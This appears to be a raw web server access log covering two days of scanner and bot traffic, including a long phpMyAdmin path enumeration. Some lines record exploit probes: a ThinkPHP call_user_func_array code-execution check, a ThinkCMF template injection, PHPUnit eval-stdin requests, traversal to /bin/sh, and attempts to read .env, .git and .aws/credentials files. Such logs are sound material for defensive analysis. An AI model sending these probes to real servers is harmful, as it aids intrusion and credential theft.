217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin2011/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /PMA/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /pma/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:44 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /phppma/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
217.44.242.166 - - [12/Aug/2022:15:36:45 +0000] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:16:17:37 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
194.165.16.71 - - [12/Aug/2022:16:19:49 +0000] "\x03" 400 226 "-" "-"
194.165.16.71 - - [12/Aug/2022:16:19:49 +0000] "\x03" 400 226 "-" "-"
154.89.5.102 - - [12/Aug/2022:16:37:51 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
185.7.214.117 - - [12/Aug/2022:16:51:00 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.195.93.98 - - [12/Aug/2022:17:08:24 +0000] "GET / HTTP/1.1" 200 109 "-" "python-requests/2.28.1"
185.7.214.117 - - [12/Aug/2022:17:53:22 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.173.35.33 - - [12/Aug/2022:17:55:58 +0000] "GET / HTTP/1.1" 200 109 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
185.196.220.70 - - [12/Aug/2022:18:14:58 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
112.252.198.16 - - [12/Aug/2022:18:15:26 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 196 "-" "-"
54.81.80.250 - - [12/Aug/2022:18:33:27 +0000] "CONNECT api.myip.la:443 HTTP/1.1" 405 224 "-" "Go-http-client/1.1"
185.7.214.117 - - [12/Aug/2022:18:48:19 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.133.58 - - [12/Aug/2022:19:19:01 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:19:20:14 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
176.58.101.212 - - [12/Aug/2022:19:22:31 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
94.102.61.10 - - [12/Aug/2022:19:45:46 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:20:14:52 +0000] "GET /console/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.221.187 - - [12/Aug/2022:20:41:34 +0000] "MGLNDD_140.238.86.79_80\n" 400 226 "-" "-"
185.7.214.117 - - [12/Aug/2022:20:58:30 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.161.131.235 - - [12/Aug/2022:21:09:58 +0000] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 226 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.117 - - [12/Aug/2022:21:26:49 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.164.20.251 - - [12/Aug/2022:21:42:11 +0000] "GET /.git/HEAD HTTP/1.1" 404 196 "-" "Python-urllib/3.6"
185.7.214.117 - - [12/Aug/2022:22:06:55 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.47.219.220 - - [12/Aug/2022:22:10:55 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.20.226.243 - - [12/Aug/2022:22:11:09 +0000] "GET / HTTP/1.0" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.129.64.144 - - [12/Aug/2022:22:57:11 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.7.214.117 - - [12/Aug/2022:23:12:35 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.18 - - [12/Aug/2022:23:12:52 +0000] "GET / HTTP/1.0" 200 109 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
67.149.187.210 - - [12/Aug/2022:23:13:39 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
201.200.4.188 - - [12/Aug/2022:23:33:20 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.196.220.70 - - [13/Aug/2022:00:04:20 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
185.7.214.117 - - [13/Aug/2022:00:04:58 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.7.214.117 - - [13/Aug/2022:00:46:16 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.89.5.122 - - [13/Aug/2022:00:47:31 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
65.49.20.66 - - [13/Aug/2022:01:02:42 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
65.49.20.90 - - [13/Aug/2022:01:06:29 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"
183.89.180.153 - - [13/Aug/2022:02:22:36 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
198.199.116.39 - - [13/Aug/2022:02:43:45 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 zgrab/0.x"
193.124.7.9 - - [13/Aug/2022:02:50:43 +0000] "GET http://example.com/ HTTP/1.1" 200 109 "-" "Go-http-client/1.1"
109.237.103.9 - - [13/Aug/2022:04:18:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [13/Aug/2022:04:18:23 +0000] "\x16\x03\x01\x01D\x01" 400 226 "-" "-"
109.237.103.123 - - [13/Aug/2022:04:22:43 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [13/Aug/2022:04:22:43 +0000] "\x16\x03\x01\x01D\x01" 400 226 "-" "-"
106.75.25.168 - - [13/Aug/2022:04:43:57 +0000] "GET / HTTP/1.0" 200 109 "-" "-"
198.235.24.28 - - [13/Aug/2022:04:45:18 +0000] "GET / HTTP/1.1" 200 109 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
205.210.31.12 - - [13/Aug/2022:05:36:48 +0000] "\x16\x03\x01" 400 226 "-" "-"
104.140.188.38 - - [13/Aug/2022:06:11:29 +0000] "GET / HTTP/1.0" 200 109 "-" "https://gdnplus.com:Gather Analyze Provide."
143.198.174.30 - - [13/Aug/2022:06:14:19 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
131.153.197.76 - - [13/Aug/2022:06:21:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
131.153.197.76 - - [13/Aug/2022:06:21:42 +0000] "POST / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
103.141.70.247 - - [13/Aug/2022:06:47:13 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.196.220.70 - - [13/Aug/2022:07:11:48 +0000] "GET / HTTP/1.1" 200 109 "-" "Linux Gnu (cow)"
66.240.192.82 - - [13/Aug/2022:07:45:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
66.240.192.82 - - [13/Aug/2022:07:46:25 +0000] "GET / HTTP/1.1" 200 109 "-" "'Mozilla/5.0 project_patchwatch'"
167.248.133.117 - - [13/Aug/2022:11:11:58 +0000] "GET / HTTP/1.1" 200 109 "-" "-"
167.248.133.117 - - [13/Aug/2022:11:11:58 +0000] "GET / HTTP/1.1" 200 109 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.117 - - [13/Aug/2022:11:11:58 +0000] "PRI * HTTP/2.0" 400 226 "-" "-"
185.7.214.117 - - [13/Aug/2022:11:47:16 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
180.109.51.149 - - [13/Aug/2022:11:58:57 +0000] "HEAD /zero HTTP/1.1" 404 - "-" "curl/7.84.0"
179.43.155.171 - - [13/Aug/2022:12:35:24 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.155.171 - - [13/Aug/2022:12:35:24 +0000] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1"
